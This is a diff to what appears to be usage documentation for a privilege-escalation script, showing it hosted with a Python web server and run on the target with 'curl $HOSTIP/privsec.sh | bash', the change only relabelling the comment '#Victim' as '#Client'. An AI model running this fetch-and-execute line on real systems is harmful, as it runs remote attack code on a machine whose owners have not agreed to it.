@@ -47,7 +47,7 @@ chmod +x privsec.sh
 
 # Local network
 sudo python3 -m http.server $PORT #Host
-curl $HOSTIP/privsec.sh | bash #Victim
+curl $HOSTIP/privsec.sh | bash #Client
 ```
 
 ## Severity Levels
